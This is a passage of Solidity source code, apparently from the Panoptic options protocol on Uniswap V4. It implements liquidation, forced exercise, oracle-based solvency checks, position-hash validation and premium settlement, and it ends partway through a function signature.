    /// @return paidAmounts The net amount of tokens paid after closing the position
    function _burnAndHandleExercise(
        bool commitLongSettled,
        int24 tickLimitLow,
        int24 tickLimitHigh,
        TokenId tokenId,
        uint128 positionSize,
        address owner
    ) internal returns (LeftRightSigned[4] memory premiaByLeg, LeftRightSigned paidAmounts) {
        // if safeMode, enforce covered at assignment
        if (isSafeMode()) {
            if (tickLimitLow > tickLimitHigh) {
                (tickLimitLow, tickLimitHigh) = (tickLimitHigh, tickLimitLow);
            }
        }

        (LeftRightUnsigned[4] memory collectedByLeg, LeftRightSigned totalSwapped) = SFPM
            .burnTokenizedPosition(poolKey(), tokenId, positionSize, tickLimitLow, tickLimitHigh);

        LeftRightSigned realizedPremia;
        (realizedPremia, premiaByLeg) = _updateSettlementPostBurn(
            owner,
            tokenId,
            collectedByLeg,
            positionSize,
            commitLongSettled
        );

        (LeftRightSigned longAmounts, LeftRightSigned shortAmounts) = PanopticMath
            .computeExercisedAmounts(tokenId, positionSize);

        paidAmounts = paidAmounts
            .toRightSlot(
                collateralToken0().exercise(
                    owner,
                    longAmounts.rightSlot(),
                    shortAmounts.rightSlot(),
                    totalSwapped.rightSlot(),
                    realizedPremia.rightSlot()
                )
            )
            .toLeftSlot(
                collateralToken1().exercise(
                    owner,
                    longAmounts.leftSlot(),
                    shortAmounts.leftSlot(),
                    totalSwapped.leftSlot(),
                    realizedPremia.leftSlot()
                )
            );
    }

    /*//////////////////////////////////////////////////////////////
                    LIQUIDATIONS & FORCED EXERCISES
    //////////////////////////////////////////////////////////////*/

    /// @notice Liquidates a distressed account. Will burn all positions and issue a bonus to the liquidator.
    /// @dev Will revert if liquidated account is solvent at one of the oracle ticks or if TWAP tick is too far away from the current tick.
    /// @dev If native currency is attached, non-EOA callers *must* accept empty calls with value up to the amount attached.
    /// @param positionIdListLiquidator List of positions owned by the liquidator
    /// @param liquidatee Address of the distressed account
    /// @param positionIdList List of positions owned by the user. Written as `[tokenId1, tokenId2, ...]`
    function liquidate(
        TokenId[] calldata positionIdListLiquidator,
        address liquidatee,
        TokenId[] calldata positionIdList
    ) external payable {
        _validatePositionList(liquidatee, positionIdList, 0);

        // Assert the account we are liquidating is actually insolvent
        int24 twapTick = getOracleTWAP();

        int24 currentTick = V4StateReader.getTick(POOL_MANAGER_V4, _V4PoolId());
        {
            // Enforce maximum delta between TWAP and currentTick to prevent extreme price manipulation
            int24 fastOracleTick;
            int24 lastObservedTick;
            (fastOracleTick, , lastObservedTick, ) = PanopticMath.getOracleTicks(
                oracleContract(),
                s_miniMedian
            );

            unchecked {
                if (Math_2.abs(currentTick - twapTick) > MAX_TWAP_DELTA_LIQUIDATION)
                    revert Errors.StaleOracle();
            }

            // Ensure the account is insolvent at twapTick (in place of slowOracleTick), currentTick, fastOracleTick, and lastObservedTick
            int24[] memory atTicks = new int24[](4);
            atTicks[0] = fastOracleTick;
            atTicks[1] = twapTick;
            atTicks[2] = lastObservedTick;
            atTicks[3] = currentTick;

            _checkSolvencyAtTicks(
                liquidatee,
                positionIdList,
                currentTick,
                atTicks,
                NO_BUFFER,
                ASSERT_INSOLVENCY,
                COMPUTE_PREMIA_AS_COLLATERAL
            );
        }

        LeftRightUnsigned tokenData0;
        LeftRightUnsigned tokenData1;
        LeftRightUnsigned shortPremium;
        {
            uint256[2][] memory positionBalanceArray = new uint256[2][](positionIdList.length);
            LeftRightUnsigned longPremium;
            (shortPremium, longPremium, positionBalanceArray) = _calculateAccumulatedPremia(
                liquidatee,
                positionIdList,
                COMPUTE_PREMIA_AS_COLLATERAL,
                ONLY_AVAILABLE_PREMIUM,
                currentTick
            );

            tokenData0 = collateralToken0().getAccountMarginDetails(
                liquidatee,
                twapTick,
                positionBalanceArray,
                shortPremium.rightSlot(),
                longPremium.rightSlot()
            );

            tokenData1 = collateralToken1().getAccountMarginDetails(
                liquidatee,
                twapTick,
                positionBalanceArray,
                shortPremium.leftSlot(),
                longPremium.leftSlot()
            );
        }

        // The protocol delegates some virtual shares to ensure the burn can be settled.
        collateralToken0().delegate(liquidatee);
        collateralToken1().delegate(liquidatee);

        LeftRightSigned bonusAmounts;
        {
            LeftRightSigned netPaid;
            LeftRightSigned[4][] memory premiasByLeg;
            // burn all options from the liquidatee

            // Do not commit any settled long premium to storage - we will do this after we determine if any long premium must be revoked
            // This is to prevent any short positions the liquidatee has being settled with tokens that will later be revoked
            // NOTE: tick limits are not applied here since it is not the liquidator's position being liquidated
            (netPaid, premiasByLeg) = _burnAllOptionsFrom(
                liquidatee,
                MIN_SWAP_TICK,
                MAX_SWAP_TICK,
                DONOT_COMMIT_LONG_SETTLED,
                positionIdList
            );

            LeftRightSigned collateralRemaining;
            // compute bonus amounts using latest tick data
            (bonusAmounts, collateralRemaining) = PanopticMath.getLiquidationBonus(
                tokenData0,
                tokenData1,
                Math_2.getSqrtRatioAtTick(twapTick),
                netPaid,
                shortPremium
            );

            // premia cannot be paid if there is protocol loss associated with the liquidatee
            // otherwise, an economic exploit could occur if the liquidator and liquidatee collude to
            // manipulate the fees in a liquidity area they control past the protocol loss threshold
            // such that the PLPs are forced to pay out premia to the liquidator
            // thus, we haircut any premium paid by the liquidatee (converting tokens as necessary) until the protocol loss is covered or the premium is exhausted
            // note that the haircutPremia function also commits the settled amounts (adjusted for the haircut) to storage, so it will be called even if there is no haircut

            // if premium is haircut from a token that is not in protocol loss, some of the liquidation bonus will be converted into that token
            address _liquidatee = liquidatee;
            int24 _twapTick = twapTick;
            TokenId[] memory _positionIdList = positionIdList;

            LeftRightSigned bonusDeltas = PanopticMath.haircutPremia(
                _liquidatee,
                _positionIdList,
                premiasByLeg,
                collateralRemaining,
                collateralToken0(),
                collateralToken1(),
                Math_2.getSqrtRatioAtTick(_twapTick),
                s_settledTokens
            );

            bonusAmounts = bonusAmounts.add(bonusDeltas);
        }

        // revoke delegated virtual shares and settle any bonus deltas with the liquidator
        collateralToken1().settleLiquidation(msg.sender, liquidatee, bonusAmounts.leftSlot());
        // native currency is represented as address(0), so it will always be currency0 alphanumerically
        collateralToken0().settleLiquidation{value: msg.value}(
            msg.sender,
            liquidatee,
            bonusAmounts.rightSlot()
        );

        // ensure the liquidator is still solvent after the liquidation
        _validateSolvency(
            msg.sender,
            positionIdListLiquidator,
            NO_BUFFER,
            COMPUTE_PREMIA_AS_COLLATERAL
        );

        emit AccountLiquidated(msg.sender, liquidatee, bonusAmounts);
    }

    /// @notice Force the exercise of a single position. Exercisor will have to pay a fee to the force exercisee.
    /// @param account Address of the distressed account
    /// @param tokenId The position to be force exercised; this position must contain at least one out-of-range long leg
    /// @param positionIdListExercisee Post-burn list of open positions in the exercisee's (`account`) account
    /// @param positionIdListExercisor List of open positions in the exercisor's (`msg.sender`) account
    /// @param usePremiaAsCollateral Whether to compute accumulated premia for all legs held by the exercisee(right slot)/exercisor(left slot) for collateral (>0), or just owed premia for long legs (0)
    function forceExercise(
        address account,
        TokenId tokenId,
        TokenId[] calldata positionIdListExercisee,
        TokenId[] calldata positionIdListExercisor,
        LeftRightUnsigned usePremiaAsCollateral
    ) external {
        // validate the exercisor's position list (the exercisee's list will be evaluated after their position is force exercised)
        _validatePositionList(msg.sender, positionIdListExercisor, 0);

        int24 lastObservedTick;
        {
            int24 fastOracleTick;
            int24 slowOracleTick;
            (fastOracleTick, slowOracleTick, lastObservedTick, ) = PanopticMath.getOracleTicks(
                oracleContract(),
                s_miniMedian
            );

            if (
                Math_2.abs(lastObservedTick - fastOracleTick) > MAX_TICK_DELTA_SUBSTITUTION ||
                Math_2.abs(lastObservedTick - slowOracleTick) > MAX_TICK_DELTA_SUBSTITUTION
            ) revert Errors.StaleOracle();
        }

        // to be eligible for force exercise, the price *must* be outside the position's range for at least 1 leg
        tokenId.validateIsExercisable(lastObservedTick);

        CollateralTracker ct0 = collateralToken0();
        CollateralTracker ct1 = collateralToken1();

        LeftRightSigned exerciseFees;
        {
            uint128 positionSize = s_positionBalance[account][tokenId].positionSize();

            (LeftRightSigned longAmounts, ) = PanopticMath.computeExercisedAmounts(
                tokenId,
                positionSize
            );

            // Compute the exerciseFee, this will decrease the further away the price is from the exercised position
            // Include any deltas in long legs between the current and oracle tick in the exercise fee
            exerciseFees = ct0.exerciseCost(
                V4StateReader.getTick(POOL_MANAGER_V4, _V4PoolId()),
                lastObservedTick,
                tokenId,
                positionSize,
                longAmounts
            );
        }

        // The protocol delegates some virtual shares to ensure the burn can be settled.
        ct0.delegate(account);
        ct1.delegate(account);

        // Exercise the option
        // Turn off ITM swapping to prevent swap at potentially unfavorable price
        _burnOptions(COMMIT_LONG_SETTLED, tokenId, account, MIN_SWAP_TICK, MAX_SWAP_TICK);

        // redistribute token composition of refund amounts if user doesn't have enough of one token to pay
        LeftRightSigned refundAmounts = PanopticMath.getRefundAmounts(
            account,
            exerciseFees,
            lastObservedTick,
            ct0,
            ct1
        );

        // settle difference between delegated amounts (from the protocol) and exercise fees/substituted tokens
        ct0.refund(account, msg.sender, refundAmounts.rightSlot());
        ct1.refund(account, msg.sender, refundAmounts.leftSlot());

        // revoke the virtual shares that were delegated after settling the difference with the exercisor
        ct0.revoke(account);
        ct1.revoke(account);

        _validateSolvency(
            account,
            positionIdListExercisee,
            NO_BUFFER,
            usePremiaAsCollateral.rightSlot() > 0
        );

        // the exercisor's position list is validated above
        // we need to assert their solvency against their collateral requirement plus a buffer
        // force exercises involve a collateral decrease with open positions, so there is a higher standard for solvency
        // a similar buffer is also invoked when minting options, which also decreases the available collateral
        if (positionIdListExercisor.length > 0)
            _validateSolvency(
                msg.sender,
                positionIdListExercisor,
                BP_DECREASE_BUFFER,
                usePremiaAsCollateral.leftSlot() > 0
            );

        emit ForcedExercised(msg.sender, account, tokenId, exerciseFees);
    }

    /*//////////////////////////////////////////////////////////////
                            SOLVENCY CHECKS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check whether an account is solvent at a given `atTick` with a collateral requirement of `buffer/10_000` multiplied by the requirement of `positionIdList`.
    /// @dev Reverts if `account` is not solvent at all provided ticks and `expectedSolvent == true`, or if `account` is solvent at all ticks and `!expectedSolvent`.
    /// @param account The account to check solvency for
    /// @param positionIdList The list of positions to check solvency for
    /// @param currentTick The current tick of the Uniswap pool (needed for fee calculations)
    /// @param atTicks An array of ticks to check solvency at
    /// @param buffer The buffer to apply to the collateral requirement
    /// @param expectedSolvent Whether the account is expected to be solvent (true) or insolvent (false) at all provided `atTicks`
    /// @param usePremiaAsCollateral Whether to compute accumulated premia for all legs held by the user for collateral (true), or just owed premia for long legs (false)
    function _checkSolvencyAtTicks(
        address account,
        TokenId[] calldata positionIdList,
        int24 currentTick,
        int24[] memory atTicks,
        uint256 buffer,
        bool expectedSolvent,
        bool usePremiaAsCollateral
    ) internal view {
        (
            LeftRightUnsigned shortPremium,
            LeftRightUnsigned longPremium,
            uint256[2][] memory positionBalanceArray
        ) = _calculateAccumulatedPremia(
                account,
                positionIdList,
                usePremiaAsCollateral,
                ONLY_AVAILABLE_PREMIUM,
                currentTick
            );

        uint256 numberOfTicks = atTicks.length;

        uint256 solvent;
        for (uint256 i; i < numberOfTicks; ) {
            unchecked {
                if (
                    _isAccountSolvent(
                        account,
                        atTicks[i],
                        positionBalanceArray,
                        shortPremium,
                        longPremium,
                        buffer
                    )
                ) solvent++;
                ++i;
            }
        }

        if (expectedSolvent && solvent != numberOfTicks) revert Errors.AccountInsolvent();
        if (!expectedSolvent && solvent != 0) revert Errors.NotMarginCalled();
    }

    /// @notice Check whether an account is solvent at a given `atTick` with a collateral requirement of `buffer/10_000` multiplied by the requirement of `positionBalanceArray`.
    /// @param account The account to check solvency for
    /// @param atTick The tick to check solvency at
    /// @param positionBalanceArray A list of balances and pool utilization for each position, of the form `[[tokenId0, balances0], [tokenId1, balances1], ...]`
    /// @param shortPremium The total amount of premium (prorated by available settled tokens) owed to the short legs of `account`
    /// @param longPremium The total amount of premium owed by the long legs of `account`
    /// @param buffer The buffer to apply to the collateral requirement
    /// @return Whether the account is solvent at the given tick
    function _isAccountSolvent(
        address account,
        int24 atTick,
        uint256[2][] memory positionBalanceArray,
        LeftRightUnsigned shortPremium,
        LeftRightUnsigned longPremium,
        uint256 buffer
    ) internal view returns (bool) {
        (uint256 balanceCross, uint256 thresholdCross) = PanopticMath.getCrossBalances(
            collateralToken0().getAccountMarginDetails(
                account,
                atTick,
                positionBalanceArray,
                shortPremium.rightSlot(),
                longPremium.rightSlot()
            ),
            collateralToken1().getAccountMarginDetails(
                account,
                atTick,
                positionBalanceArray,
                shortPremium.leftSlot(),
                longPremium.leftSlot()
            ),
            Math_2.getSqrtRatioAtTick(atTick)
        );

        // compare balance and required tokens, can use unsafe div because denominator is always nonzero
        return balanceCross >= Math_2.mulDivRoundingUp(thresholdCross, buffer, 10_000);
    }

    /// @notice Checks whether the current tick has deviated by `> MAX_TICKS_DELTA` from the slow oracle median tick.
    /// @return Whether the current tick has deviated from the median by `> MAX_TICKS_DELTA`
    function isSafeMode() public view returns (bool) {
        uint256 medianData = s_miniMedian;
        unchecked {
            // If ticks have recently deviated more than +/- ~10%, enforce covered mints
            return
                Math_2.abs(
                    V4StateReader.getTick(POOL_MANAGER_V4, _V4PoolId()) -
                        ((int24(
                            uint24(medianData >> ((uint24(medianData >> (192 + 3 * 3)) % 8) * 24))
                        ) +
                            int24(
                                uint24(
                                    medianData >> ((uint24(medianData >> (192 + 3 * 4)) % 8) * 24)
                                )
                            )) / 2)
                ) > MAX_TICKS_DELTA;
        }
    }

    /*//////////////////////////////////////////////////////////////
                 POSITIONS HASH GENERATION & VALIDATION
    //////////////////////////////////////////////////////////////*/

    /// @notice Makes sure that the positions in the incoming user's list match the existing active option positions.
    /// @param account The owner of the incoming list of positions
    /// @param positionIdList The existing list of active options for the owner
    /// @param offset The amount of positions from the end of the list to exclude from validation
    function _validatePositionList(
        address account,
        TokenId[] calldata positionIdList,
        uint256 offset
    ) internal view {
        uint256 pLength;

        unchecked {
            pLength = positionIdList.length - offset;
        }

        uint256 fingerprintIncomingList;

        for (uint256 i = 0; i < pLength; ) {
            fingerprintIncomingList = PanopticMath.updatePositionsHash(
                fingerprintIncomingList,
                positionIdList[i],
                ADD
            );
            unchecked {
                ++i;
            }
        }

        // revert if fingerprint for provided `_positionIdList` does not match the one stored for the `_account`
        if (fingerprintIncomingList != s_positionsHash[account]) revert Errors.InputListFail();
    }

    /// @notice Updates the hash for all positions owned by an account. This fingerprints the list of all incoming options with a single hash.
    /// @dev The outcome of this function will be to update the hash of positions.
    /// This is done as a duplicate/validation check of the incoming list O(N).
    /// @dev The positions hash is stored as the XOR of the keccak256 of each tokenId. Updating will XOR the existing hash with the new tokenId.
    /// The same update can either add a new tokenId (when minting an option), or remove an existing one (when burning it).
    /// @param account The owner of `tokenId`
    /// @param tokenId The option position
    /// @param addFlag Whether to add `tokenId` to the hash (true) or remove it (false)
    function _updatePositionsHash(address account, TokenId tokenId, bool addFlag) internal {
        // Get the current position hash value (fingerprint of all pre-existing positions created by `_account`)
        // Add the current tokenId to the positionsHash as XOR'd
        // since 0 ^ x = x, no problem on first mint
        // Store values back into the user option details with the updated hash (leaves the other parameters unchanged)
        uint256 newHash = PanopticMath.updatePositionsHash(
            s_positionsHash[account],
            tokenId,
            addFlag
        );
        if ((newHash >> 248) > MAX_OPEN_LEGS) revert Errors.TooManyLegsOpen();
        s_positionsHash[account] = newHash;
    }

    /*//////////////////////////////////////////////////////////////
                                QUERIES
    //////////////////////////////////////////////////////////////*/

    /// @notice Computes and returns all ticks used for collateral checks at mint/burn.
    /// @return currentTick The current tick of the Uniswap V4 pool
    /// @return fastOracleTick The fast oracle tick computed as the median of the past N observations in the oracle contract
    /// @return slowOracleTick The slow oracle tick (either composed of observations retrieved from Uniswap or observations stored in `s_miniMedian`)
    /// @return latestObservation The latest observation from the oracle contract
    /// @return medianData The current value of the 8-slot internal observation queue (`s_miniMedian`)
    function getOracleTicks()
        external
        view
        returns (
            int24 currentTick,
            int24 fastOracleTick,
            int24 slowOracleTick,
            int24 latestObservation,
            uint256 medianData
        )
    {
        currentTick = V4StateReader.getTick(POOL_MANAGER_V4, _V4PoolId());

        (fastOracleTick, slowOracleTick, latestObservation, ) = PanopticMath.getOracleTicks(
            oracleContract(),
            s_miniMedian
        );
        medianData = s_miniMedian;
    }

    /// @notice Get the current number of legs across all open positions for an account.
    /// @param user The account to query
    /// @return Number of legs across the open positions of `user`
    function numberOfLegs(address user) external view returns (uint256) {
        return s_positionsHash[user] >> 248;
    }

    /// @notice Get the `tokenId` position data for `user`.
    /// @param user The account that owns `tokenId`
    /// @param tokenId The position to query
    /// @return `currentTick` at mint
    /// @return Fast oracle tick at mint
    /// @return Slow oracle tick at mint
    /// @return Last observed tick at mint
    /// @return Utilization of currency0 at mint
    /// @return Utilization of currency1 at mint
    /// @return Size of the position
    function positionData(
        address user,
        TokenId tokenId
    ) external view returns (int24, int24, int24, int24, int256, int256, uint128) {
        return s_positionBalance[user][tokenId].unpackAll();
    }

    /// @notice Get the oracle price used to check solvency in liquidations.
    /// @return twapTick The current oracle price used to check solvency in liquidations
    function getOracleTWAP() internal view returns (int24 twapTick) {
        twapTick = PanopticMath.twapFilter(oracleContract(), TWAP_WINDOW);
    }

    /*//////////////////////////////////////////////////////////////
                  PREMIA & PREMIA SPREAD CALCULATIONS
    //////////////////////////////////////////////////////////////*/

    /// @notice Ensure the effective liquidity in a given chunk is above a certain threshold.
    /// @param tokenId An option position
    /// @param leg A leg index of `tokenId` corresponding to a tickLower-tickUpper chunk
    /// @param effectiveLiquidityLimitX32 Maximum amount of "spread" defined as removedLiquidity/netLiquidity for a new position
    /// denominated as X32 = (`ratioLimit * 2^32`)
    /// @return totalLiquidity The total liquidity deposited in that chunk: `totalLiquidity = netLiquidity + removedLiquidity`
    function _checkLiquiditySpread(
        TokenId tokenId,
        uint256 leg,
        uint256 effectiveLiquidityLimitX32
    ) internal view returns (uint256 totalLiquidity) {
        uint256 netLiquidity;
        uint256 removedLiquidity;
        (totalLiquidity, netLiquidity, removedLiquidity) = _getLiquidities(tokenId, leg);

        // compute and return effective liquidity. Return if short=net=0, which is closing short position
        if (netLiquidity == 0 && removedLiquidity == 0) return totalLiquidity;

        uint256 effectiveLiquidityFactorX32;
        unchecked {
            effectiveLiquidityFactorX32 = (removedLiquidity * 2 ** 32) / netLiquidity;
        }

        // put a limit on how much new liquidity in one transaction can be deployed into this leg
        // the effective liquidity measures how many times more the newly added liquidity is compared to the existing/base liquidity
        if (effectiveLiquidityFactorX32 > effectiveLiquidityLimitX32)
            revert Errors.EffectiveLiquidityAboveThreshold();
    }

    /// @notice Compute the premia collected for a single option position `tokenId`.
    /// @param tokenId The option position
    /// @param positionSize The number of contracts (size) of the option position
    /// @param owner The holder of the tokenId option
    /// @param usePremiaAsCollateral Whether to compute accumulated premia for all legs held by the user for collateral (true), or just owed premia for long legs (false)
    /// @param atTick The tick at which the premia is calculated -> use (`atTick < type(int24).max`) to compute it
    /// up to current block. `atTick = type(int24).max` will only consider fees as of the last on-chain transaction
    /// @return premiaByLeg The amount of premia owed to the user for each leg of the position
    /// @return premiumAccumulatorsByLeg The amount of premia accumulated for each leg of the position
    function _getPremia(
        TokenId tokenId,
        uint128 positionSize,
        address owner,
        bool usePremiaAsCollateral,
        int24 atTick
    )
        internal
        view
        returns (
            LeftRightSigned[4] memory premiaByLeg,
            uint256[2][4] memory premiumAccumulatorsByLeg
        )
    {
        uint256 numLegs = tokenId.countLegs();
        for (uint256 leg = 0; leg < numLegs; ) {
            uint256 isLong = tokenId.isLong(leg);
            if ((isLong == 1) || usePremiaAsCollateral) {
                LiquidityChunk liquidityChunk = PanopticMath.getLiquidityChunk(
                    tokenId,
                    leg,
                    positionSize
                );
                uint256 tokenType = tokenId.tokenType(leg);

                (premiumAccumulatorsByLeg[leg][0], premiumAccumulatorsByLeg[leg][1]) = SFPM
                    .getAccountPremium(
                        _V4PoolId(),
                        address(this),
                        tokenType,
                        liquidityChunk.tickLower(),
                        liquidityChunk.tickUpper(),
                        atTick,
                        isLong
                    );

                unchecked {
                    LeftRightUnsigned premiumAccumulatorLast = s_options[owner][tokenId][leg];

                    premiaByLeg[leg] = LeftRightSigned
                        .wrap(0)
                        .toRightSlot(
                            int128(
                                int256(
                                    ((premiumAccumulatorsByLeg[leg][0] -
                                        premiumAccumulatorLast.rightSlot()) *
                                        (liquidityChunk.liquidity())) / 2 ** 64
                                )
                            )
                        )
                        .toLeftSlot(
                            int128(
                                int256(
                                    ((premiumAccumulatorsByLeg[leg][1] -
                                        premiumAccumulatorLast.leftSlot()) *
                                        (liquidityChunk.liquidity())) / 2 ** 64
                                )
                            )
                        );
                }

                if (isLong == 1) {
                    premiaByLeg[leg] = LeftRightSigned.wrap(0).sub(premiaByLeg[leg]);
                }
            }
            unchecked {
                ++leg;
            }
        }
    }

    /*//////////////////////////////////////////////////////////////
                        AVAILABLE PREMIUM LOGIC
    //////////////////////////////////////////////////////////////*/

    /// @notice Settle unpaid premium for one `legIndex` on a position owned by `owner`.
    /// @dev Called by sellers on buyers of their chunk to increase the available premium for withdrawal (before closing their position).
    /// @dev This feature is only available when `owner` is solvent and has the requisite tokens to settle the premium.
    /// @param positionIdList Exhaustive list of open positions for `owner` used for solvency checks where the tokenId to settle is placed at the last index
    /// @param owner The owner of the option position to make premium payments on
    /// @param legIndex the index of the leg in tokenId that is to be collected on (must be isLong=1)
    /// @param usePremiaAsCollateral Whether to compute accumulated premia for all legs held by the settlee for collateral (true), or just owed premia for long legs (false)
    function settleLongPremium(
        TokenId[] calldata positionIdList,
        address owner,
        uint256 legIndex,
        bool usePremiaAsCollateral
    ) external {
        _validatePositionList(owner, positionIdList, 0);

        TokenId tokenId;
        unchecked {
            tokenId = positionIdList[positionIdList.length - 1];
        }

        if (tokenId.isLong(legIndex) == 0 || legIndex > 3) revert Errors.NotALongLeg();

        CollateralTracker ct0 = collateralToken0();
        CollateralTracker ct1 = collateralToken1();

        // The protocol delegates some virtual shares to ensure the premia can be settled.
        ct0.delegate(owner);
        ct1.delegate(owner);

        LiquidityChunk liquidityChunk = PanopticMath.getLiquidityChunk(
            tokenId,
            legIndex,
            s_positionBalance[owner][tokenId].positionSize()
        );

        int24 currentTick = V4StateReader.getTick(POOL_MANAGER_V4, _V4PoolId());

        LeftRightUnsigned accumulatedPremium;
        {
            (uint128 premiumAccumulator0, uint128 premiumAccumulator1) = SFPM.getAccountPremium(
                _V4PoolId(),
                address(this),
                tokenId.tokenType(legIndex),
                liquidityChunk.tickLower(),
                liquidityChunk.tickUpper(),
                currentTick,
                1
            );
            accumulatedPremium = LeftRightUnsigned.wrap(premiumAccumulator0).toLeftSlot(
                premiumAccumulator1
            );

            // update the premium accumulator for the long position to the latest value
            // (the entire premia delta will be settled)
            LeftRightUnsigned premiumAccumulatorsLast = s_options[owner][tokenId][legIndex];
            s_options[owner][tokenId][legIndex] = accumulatedPremium;

            accumulatedPremium = accumulatedPremium.sub(premiumAccumulatorsLast);
        }

        unchecked {
            uint256 liquidity = liquidityChunk.liquidity();

            // update the realized premia
            LeftRightSigned realizedPremia = LeftRightSigned
                .wrap(0)
                .toRightSlot(int128(int256((accumulatedPremium.rightSlot() * liquidity) / 2 ** 64)))
                .toLeftSlot(int128(int256((accumulatedPremium.leftSlot() * liquidity) / 2 ** 64)));

            // deduct the paid premium tokens from the owner's balance and add them to the cumulative settled token delta
            ct0.exercise(owner, 0, 0, 0, -realizedPremia.rightSlot());
            ct1.exercise(owner, 0, 0, 0, -realizedPremia.leftSlot());

            bytes32 chunkKey = keccak256(
                abi.encodePacked(
                    tokenId.strike(legIndex),
                    tokenId.width(legIndex),
                    tokenId.tokenType(legIndex)
                )
            );
            // commit the delta in settled tokens (all of the premium paid by long chunks in the tokenIds list) to storage
            s_settledTokens[chunkKey] = s_settledTokens[chunkKey].add(
                LeftRightUnsigned.wrap(uint256(LeftRightSigned.unwrap(realizedPremia)))
            );

            emit PremiumSettled(owner, tokenId, legIndex, realizedPremia);
        }

        int24 lastObservedTick;
        uint96 tickData;
        {
            int24 fastOracleTick;
            int24 slowOracleTick;
            (fastOracleTick, slowOracleTick, lastObservedTick, ) = PanopticMath.getOracleTicks(
                oracleContract(),
                s_miniMedian
            );

            if (
                Math_2.abs(lastObservedTick - fastOracleTick) > MAX_TICK_DELTA_SUBSTITUTION ||
                Math_2.abs(lastObservedTick - slowOracleTick) > MAX_TICK_DELTA_SUBSTITUTION
            ) revert Errors.StaleOracle();

            tickData = PositionBalanceLibrary.packTickData(
                V4StateReader.getTick(POOL_MANAGER_V4, _V4PoolId()),
                fastOracleTick,
                slowOracleTick,
                lastObservedTick
            );
        }

        LeftRightSigned refundAmounts = PanopticMath.getRefundAmounts(
            owner,
            LeftRightSigned.wrap(0),
            lastObservedTick,
            ct0,
            ct1
        );

        // allow the caller to settle tokens owed to the protocol by the settlee in exchange for the surplus token
        ct0.refund(owner, msg.sender, refundAmounts.rightSlot());
        ct1.refund(owner, msg.sender, refundAmounts.leftSlot());

        ct0.revoke(owner);
        ct1.revoke(owner);

        // ensure the owner is solvent (insolvent accounts are not permitted to pay premium unless they are being liquidated)
        _checkSolvency(owner, positionIdList, tickData, NO_BUFFER, usePremiaAsCollateral);
    }

    /// @notice Adds collected tokens to `s_settledTokens` and adjusts `s_grossPremiumLast` for any liquidity added.
    /// @dev Always called after `mintTokenizedPosition`.
    /// @param tokenId The option position that was minted
    /// @param collectedByLeg The amount of tokens collected in the corresponding chunk for each leg of the position
    /// @param positionSize The size of the position, expressed in terms of the asset
    /// @param effectiveLiquidityLimitX32 Maximum amount of "spread" defined as `removedLiquidity/netLiquidity`
    function _updateSettlementPostMint(
        TokenId tokenId,
        LeftRightUnsigned[4] memory collectedByLeg,
        uint128 positionSize,
        uint64 effectiveLiquidityLimitX32
    ) internal {
        // ADD the current tokenId to the position list hash (hash = XOR of all keccak256(tokenId))
        // and increase the number of positions counter by 1.
        _updatePositionsHash(msg.sender, tokenId, ADD);

        uint256 numLegs = tokenId.countLegs();
        for (uint256 leg = 0; leg < numLegs; ++leg) {
            uint256 isLong = tokenId.isLong(leg);

            bytes32 chunkKey = keccak256(
                abi.encodePacked(tokenId.strike(leg), tokenId.width(leg), tokenId.tokenType(leg))
            );

            // add any tokens collected from Uniswap in a given chunk to the settled tokens available for withdrawal by sellers
            s_settledTokens[chunkKey] = s_settledTokens[chunkKey].add(collectedByLeg[leg]);

            LiquidityChunk liquidityChunk = PanopticMath.getLiquidityChunk(
                tokenId,
                leg,
                positionSize
            );

            uint256 grossCurrent0;
            uint256 grossCurrent1;
            {
                uint256 tokenType = tokenId.tokenType(leg);
                // can use (type(int24).max flag because premia accumulators were updated during the mintTokenizedPosition step.
                (grossCurrent0, grossCurrent1) = SFPM.getAccountPremium(
                    _V4PoolId(),
                    address(this),
                    tokenType,
                    liquidityChunk.tickLower(),
                    liquidityChunk.tickUpper(),
                    type(int24).max,
                    isLong
                );

                s_options[msg.sender][tokenId][leg] = LeftRightUnsigned
                    .wrap(uint128(grossCurrent0))
                    .toLeftSlot(uint128(grossCurrent1));
            }

            // if position is long, ensure that removed liquidity does not deplete strike beyond min(MAX_SPREAD, user-provided effectiveLiquidityLimit)
            // new totalLiquidity (total sold) = removedLiquidity + netLiquidity (R + N)
            uint256 totalLiquidity = _checkLiquiditySpread(
                tokenId,
                leg,
                isLong == 0 ? MAX_SPREAD : Math_2.min(effectiveLiquidityLimitX32, MAX_SPREAD)
            );

            // if position is short, adjust `grossPremiumLast` upward to account for the increase in short liquidity
            if (isLong == 0) {
                unchecked {
                    // L
                    LeftRightUnsigned grossPremiumLast = s_grossPremiumLast[chunkKey];
                    // R
                    uint256 positionLiquidity = liquidityChunk.liquidity();
                    // T (totalLiquidity is (T + R) after minting)
                    uint256 totalLiquidityBefore = totalLiquidity - positionLiquidity;

                    // We need to adjust the grossPremiumLast value such that the result of
                    // (grossPremium - adjustedGrossPremiumLast) * updatedTotalLiquidityPostMint / 2**64 is equal to (grossPremium - grossPremiumLast) * totalLiquidityBeforeMint / 2**64
                    // G: total gross premium
                    // T: totalLiquidityBeforeMint
                    // R: positionLiquidity
                    // C: current grossPremium value
                    // L: current grossPremiumLast value
                    // Ln: updated grossPremiumLast value
                    // T * (C - L) = G
                    // (T + R) * (C - Ln) = G
                    //
                    // T * (C - L) = (T + R) * (C - Ln)
                    // (TC - TL) / (T + R) = C - Ln
                    // Ln = C - (TC - TL)/(T + R)
                    // Ln = (CT + CR - TC + TL)/(T+R)
                    // Ln = (CR + TL)/(T+R)

                    s_grossPremiumLast[chunkKey] = LeftRightUnsigned
                        .wrap(
                            uint128(
                                (grossCurrent0 *
                                    positionLiquidity +
                                    grossPremiumLast.rightSlot() *
                                    totalLiquidityBefore) / totalLiquidity
                            )
                        )
                        .toLeftSlot(
                            uint128(
                                (grossCurrent1 *
                                    positionLiquidity +
                                    grossPremiumLast.leftSlot() *
                                    totalLiquidityBefore) / totalLiquidity
                            )
                        );
                }
            }
        }
    }

    /// @notice Query the amount of premium available for withdrawal given a certain `premiumOwed` for a chunk.
    /// @dev Based on the ratio between `settledTokens` and the total premium owed to sellers in a chunk.
    /// @dev The ratio is capped at 1 (as the base ratio can be greater than one if some seller forfeits enough premium).
    /// @param totalLiquidity The updated total liquidity amount for the chunk
    /// @param settledTokens LeftRight accumulator for the amount of tokens that have been settled (collected or paid)
    /// @param grossPremiumLast The `last` values used with `premiumAccumulators` to compute the total premium owed to sellers
    /// @param premiumOwed The amount of premium owed to sellers in the chunk
    /// @param premiumAccumulators The current values of the premium accumulators for the chunk
    /// @return The amount of currency0/currency1 premium available for withdrawal
    function _getAvailablePremium(
        uint256 totalLiquidity,
